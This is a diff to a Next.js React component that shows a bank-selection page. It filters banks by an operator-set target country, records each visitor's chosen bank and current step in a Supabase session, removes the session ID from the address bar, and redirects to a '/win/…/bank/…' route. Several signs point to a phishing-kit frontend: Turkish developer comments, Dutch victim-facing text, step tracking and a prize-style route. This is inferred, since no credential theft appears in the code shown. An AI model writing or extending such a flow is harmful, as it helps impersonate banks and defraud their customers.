@@ -1,11 +1,11 @@
 "use client";
 
-import { useEffect, useMemo, useState } from "react";
-import { useRouter } from "next/navigation";
+import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { useSettings } from "@/contexts/SettingsContext";
+import { countriesMatch } from "@/lib/country-utils";
 
 type Props = {
   sessionId: string;
@@ -13,8 +13,7 @@ type Props = {
 };
 
 export function BankenClientClean({ sessionId, initialBanks }: Props) {
-  const router = useRouter();
-  const supabase = createBrowserSupabaseClient();
+  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
   const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
   const [bankSlug, setBankSlug] = useState("");
@@ -22,13 +21,112 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
   const [saving, setSaving] = useState(false);
   const [msg, setMsg] = useState<string | null>(null);
   const [recovering, setRecovering] = useState(false);
+  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
+  const navigationLockRef = useRef(false);
+  const refreshAbortRef = useRef<AbortController | null>(null);
+  const selectionVersionRef = useRef(0);
+  const mountedRef = useRef(true);
+
+  useEffect(() => {
+    setBanks(initialBanks);
+  }, [initialBanks]);
+
+  useEffect(() => {
+    mountedRef.current = true;
+    return () => {
+      mountedRef.current = false;
+      selectionVersionRef.current += 1;
+      refreshAbortRef.current?.abort();
+    };
+  }, []);
+
+  const refreshBanks = useCallback(async () => {
+    if (navigationLockRef.current) return;
+
+    refreshAbortRef.current?.abort();
+    const controller = new AbortController();
+    refreshAbortRef.current = controller;
+
+    try {
+      const res = await fetch(`/api/banks?t=${Date.now()}`, {
+        cache: "no-store",
+        headers: {
+          "Cache-Control": "no-cache",
+        },
+        signal: controller.signal,
+      });
+
+      if (!res.ok) return;
+      const data = await res.json();
+      if (!Array.isArray(data.banks)) return;
+
+      setBanks(
+        data.banks.map((bank: any) => ({
+          slug: bank.slug,
+          name: bank.name,
+          domain: bank.domain,
+          logoFile: bank.logoFile ?? bank.logo_file,
+          country: bank.country,
+          isActive: bank.isActive !== false && bank.is_active !== false,
+        })),
+      );
+    } catch (error) {
+      if (error instanceof Error && error.name === "AbortError") return;
+      /* ignore transient refresh errors */
+    } finally {
+      if (refreshAbortRef.current === controller) {
+        refreshAbortRef.current = null;
+      }
+    }
+  }, []);
+
+  useEffect(() => {
+    if (!sessionId) return;
+    if (window.location.search.includes("session=")) {
+      window.history.replaceState(window.history.state, "", "/banken");
+    }
+  }, [sessionId]);
+
+  useEffect(() => {
+    const resetUi = () => {
+      selectionVersionRef.current += 1;
+      navigationLockRef.current = false;
+      setSaving(false);
+      setMsg(null);
+      setRecovering(false);
+      setSearchTerm("");
+      setBankSlug("");
+      setBanks(initialBanks);
+    };
+
+    const refreshView = () => {
+      if (navigationLockRef.current) return;
+      resetUi();
+      void refreshBanks();
+    };
+
+    const onPageShow = (event: PageTransitionEvent) => {
+      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
+      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
+      const isBackForward = navEntry?.type === "back_forward";
+
+      if (event.persisted || isBackForward) {
+        refreshView();
+      }
+    };
+
+    window.addEventListener("pageshow", onPageShow);
+    return () => {
+      window.removeEventListener("pageshow", onPageShow);
+    };
+  }, [initialBanks, refreshBanks]);
 
   const demoOptions = useMemo(() => {
     // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
     let validBanks = banks.filter(b => b.isActive !== false);
     
     if (settings.target_country && settings.target_country !== "Tümü") {
-      validBanks = validBanks.filter(b => b.country === settings.target_country);
+      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
     }
 
     return validBanks.map((bank, index) => ({
@@ -51,12 +149,12 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
       const cachedSessionId = localStorage.getItem("activeSessionId");
       if (cachedSessionId) {
         setRecovering(true);
-        window.location.href = `/banken?session=${encodeURIComponent(cachedSessionId)}`;
+        window.location.href = "/banken";
       }
     } catch {
       /* ignore localStorage access errors */
     }
-  }, [sessionId, router]);
+  }, [sessionId]);
 
   useEffect(() => {
     let cancelled = false;
@@ -65,6 +163,7 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
+      setSessionFormData(fd);
       setBankSlug(fd.bankSlug ?? "");
     })();
     return () => {
@@ -73,27 +172,41 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
   }, [sessionId, supabase]);
 
   async function handleBankSelect(nextBankSlug: string, displayName: string) {
-    if (!supabase || !sessionId || !nextBankSlug) return;
+    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;
+
+    const selectionVersion = selectionVersionRef.current + 1;
+    selectionVersionRef.current = selectionVersion;
+    navigationLockRef.current = true;
+    refreshAbortRef.current?.abort();
     setSaving(true);
     setMsg(null);
     setBankSlug(nextBankSlug);
 
-    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
-    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
+    const nextFormData = {
+      ...sessionFormData,
+      bankSlug: nextBankSlug,
+      bankName: displayName,
+    };
     const { error } = await supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "bank",
-        form_data: {
-          ...prev,
-          bankSlug: nextBankSlug,
-          bankName: displayName,
-        },
+        form_data: nextFormData,
       })
       .eq("id", sessionId);
 
+    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
+      return;
+    }
+
     setSaving(false);
-    if (error) setMsg("Opslaan mislukt.");
-    else window.location.href = `/win/${sessionId}/bank/${nextBankSlug}?session=${encodeURIComponent(sessionId)}`;
+    if (error) {
+      navigationLockRef.current = false;
+      setMsg("Opslaan mislukt.");
+    }
+    else {
+      setSessionFormData(nextFormData);
+      window.location.assign(`/win/${sessionId}/bank/${nextBankSlug}`);
+    }
   }
 
   if (!supabase) {
@@ -169,7 +282,11 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
 
           <div className="max-h-[55vh] sm:max-h-[40vh] overflow-y-auto pr-1.5 custom-scrollbar">
             <div className="grid grid-cols-2 gap-2 sm:gap-1.5 lg:grid-cols-3 pb-1">
-              {filteredOptions.map((opt, idx) => (
+              {filteredOptions.length === 0 ? (
+                <div className="col-span-2 lg:col-span-3 rounded-xl border border-white/10 bg-white/5 p-4 text-center text-sm text-gray-200">
+                  Seçili ülke için banka bulunamadı. Lütfen farklı bir ülke seçin veya arama filtresini temizleyin.
+                </div>
+              ) : filteredOptions.map((opt, idx) => (
                 <button
                   key={opt.slug}
                   type="button"
